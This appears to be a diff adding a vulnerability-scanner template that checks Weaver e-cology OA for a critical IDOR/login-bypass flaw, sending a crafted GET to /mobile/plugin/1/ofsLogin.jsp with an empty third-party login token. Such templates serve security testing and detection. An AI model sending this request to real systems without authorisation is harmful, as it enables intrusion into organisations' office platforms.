@@ -1,0 +1,22 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-idor-CT-727311
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Idor Ct 727311
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-idor-CT-727311'
+  tags: xpoc
+  reference:
+  - https://www.weaver.com.cn/cs/securityDownload.html?src=cn
+http:
+- method: GET
+  path:
+  - /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - /login/Login.jsp
